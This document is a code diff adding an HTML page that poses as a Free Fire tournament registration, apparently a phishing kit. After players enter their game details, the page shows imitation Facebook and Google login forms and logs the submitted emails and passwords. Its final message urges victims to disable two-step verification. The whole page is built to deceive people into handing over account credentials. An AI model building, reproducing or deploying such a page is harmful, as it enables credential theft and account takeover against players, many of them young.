@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Free Fire Tournament Registration</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: url('https://i.imgur.com/VWJBI4F.jpg') no-repeat center center fixed;
+      background-size: cover;
+      color: white;
+      position: relative;
+      min-height: 100vh;
+    }
+    /* Developer credit at bottom */
+    #developer-credit {
+      position: fixed;
+      bottom: 10px;
+      width: 100%;
+      text-align: center;
+      font-size: 14px;
+      color: #ddd;
+      font-weight: 600;
+      text-shadow: 0 0 5px black;
+    }
+    .container {
+      backdrop-filter: blur(8px);
+      background: rgba(0, 0, 0, 0.6);
+      max-width: 400px;
+      margin: 5% auto;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 15px rgba(255,255,255,0.2);
+    }
+    h2 {
+      text-align: center;
+    }
+    input, button {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border-radius: 6px;
+      border: none;
+      font-size: 16px;
+    }
+    button {
+      font-weight: 600;
+      cursor: pointer;
+    }
+    /* Simple Facebook button */
+    .login-btn.fb {
+      background-color: #1877f2; /* Facebook blue */
+      color: white;
+      border-radius: 6px;
+      padding: 12px;
+      border: none;
+      font-weight: 600;
+      cursor: pointer;
+      width: 100%;
+      margin: 10px 0;
+    }
+    .login-btn.fb:hover {
+      background-color: #155db2;
+    }
+    /* Simple Google button */
+    .login-btn.google {
+      background-color: #db4437; /* Google red */
+      color: white;
+      border-radius: 6px;
+      padding: 12px;
+      border: none;
+      font-weight: 600;
+      cursor: pointer;
+      width: 100%;
+      margin: 10px 0;
+    }
+    .login-btn.google:hover {
+      background-color: #c33c2e;
+    }
+    .login-options {
+      text-align: center;
+      margin-top: 20px;
+    }
+    .real-login {
+      background: white;
+      color: black;
+      max-width: 360px;
+      margin: 30px auto;
+      padding: 20px;
+      border-radius: 8px;
+      font-family: Arial, sans-serif;
+      display: none;
+    }
+    .real-login h3 {
+      color: #1877f2;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .real-login.google h3 {
+      color: #db4437;
+    }
+    .real-login input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 16px;
+    }
+    .real-login button {
+      background-color: #1877f2;
+      color: white;
+      font-weight: bold;
+    }
+    .real-login.google button {
+      background-color: #db4437;
+    }
+    #thankyou-message {
+      text-align: center;
+      font-size: 1.2em;
+      display: none;
+      background: rgba(0,0,0,0.6);
+      padding: 30px;
+      border-radius: 12px;
+      margin: 30px auto;
+      max-width: 400px;
+    }
+    /* Password toggle style */
+    .password-container {
+      position: relative;
+    }
+    .password-container input[type="password"],
+    .password-container input[type="text"] {
+      width: 100%;
+      padding-right: 40px;
+    }
+    .toggle-password {
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      user-select: none;
+      color: #888;
+      font-weight: 600;
+    }
+  </style>
+</head>
+<body>
+  <div class="container" id="registration">
+    <h2>Free Fire Tournament</h2>
+    <input type="text" placeholder="Your Name" id="name" />
+    <input type="text" placeholder="Game ID" id="gameId" />
+    <input type="text" placeholder="In-Game Name (IGN)" id="ign" />
+    <button onclick="submitForm()">Submit</button>
+  </div>
+
+  <div class="container" id="login" style="display:none">
+    <h2>Login to Continue</h2>
+    <div class="login-options">
+      <button class="login-btn fb" onclick="showFBLogin()">Login with Facebook</button>
+      <button class="login-btn google" onclick="showGoogleLogin()">Login with Google</button>
+    </div>
+  </div>
+
+  <!-- Fake Facebook Login UI -->
+  <div class="real-login" id="fb-login">
+    <h3>Facebook Login</h3>
+    <input type="text" id="fbEmail" placeholder="Email or phone number" />
+    <div class="password-container">
+      <input type="password" id="fbPassword" placeholder="Password" />
+      <span class="toggle-password" onclick="togglePassword('fbPassword', this)">Show</span>
+    </div>
+    <button onclick="submitFBLogin()">Log In</button>
+    <div style="text-align:center; margin-top:10px; font-size: 14px; color: #1877f2; cursor:pointer;" onclick="alert('Forgot password? This is a demo form and does not support password recovery.')">Forgot Password?</div>
+    <div style="text-align:center; margin-top:5px; font-size: 14px; color: #1877f2; cursor:pointer;" onclick="alert('Create account? This is a demo form.')">Create Account</div>
+  </div>
+
+  <!-- Fake Google Login UI -->
+  <div class="real-login google" id="google-login">
+    <h3>Sign in with Google</h3>
+    <input type="text" id="googleEmail" placeholder="Email or phone" />
+    <div class="password-container">
+      <input type="password" id="googlePassword" placeholder="Enter your password" />
+      <span class="toggle-password" onclick="togglePassword('googlePassword', this)">Show</span>
+    </div>
+    <button onclick="submitGoogleLogin()">Next</button>
+    <div style="text-align:center; margin-top:10px; font-size: 14px; color: #db4437; cursor:pointer;" onclick="alert('Forgot password? This is a demo form and does not support password recovery.')">Forgot Password?</div>
+    <div style="text-align:center; margin-top:5px; font-size: 14px; color: #db4437; cursor:pointer;" onclick="alert('Create account? This is a demo form.')">Create Account</div>
+  </div>
+
+  <div id="thankyou-message">
+    <p>Can't verify your account? If you have two-step verification enabled, please disable it and register again. We will contact you soon.</p>
+  </div>
+
+  <div id="developer-credit">Free Fire © Garena International I Private Limited</div>
+
+  <script>
+    function submitForm() {
+      const name = document.getElementById('name').value.trim();
+      const gameId = document.getElementById('gameId').value.trim();
+      const ign = document.getElementById('ign').value.trim();
+      if (name && gameId && ign) {
+        document.getElementById('registration').style.display = 'none';
+        document.getElementById('login').style.display = 'block';
+      } else {
+        alert('Please fill all fields');
+      }
+    }
+
+    function showFBLogin() {
+      document.getElementById('login').style.display = 'none';
+      document.getElementById('fb-login').style.display = 'block';
+    }
+
+    function showGoogleLogin() {
+      document.getElementById('login').style.display = 'none';
+      document.getElementById('google-login').style.display = 'block';
+    }
+
+    function submitFBLogin() {
+      const email = document.getElementById('fbEmail').value.trim();
+      const pass = document.getElementById('fbPassword').value.trim();
+      if (email && pass) {
+        console.log("login.txt:");
+        console.log("Facebook Email: " + email);
+        console.log("Password: " + pass);
+        document.getElementById('fb-login').style.display = 'none';
+        document.getElementById('thankyou-message').style.display = 'block';
+      } else {
+        alert("Please fill both fields");
+      }
+    }
+
+    function submitGoogleLogin() {
+      const email = document.getElementById('googleEmail').value.trim();
+      const pass = document.getElementById('googlePassword').value.trim();
+      if (email && pass) {
+        console.log("login.txt:");
+        console.log("Google Email: " + email);
+        console.log("Password: " + pass);
+        document.getElementById('google-login').style.display = 'none';
+        document.getElementById('thankyou-message').style.display = 'block';
+      } else {
+        alert("Please fill both fields");
+      }
+    }
+
+    function togglePassword(id, el) {
+      const input = document.getElementById(id);
+      if (input.type === "password") {
+        input.type = "text";
+        el.textContent = "Hide";
+      } else {
+        input.type = "password";
+        el.textContent = "Show";
+      }
+    }
+  </script>
+</body>
+  </html>
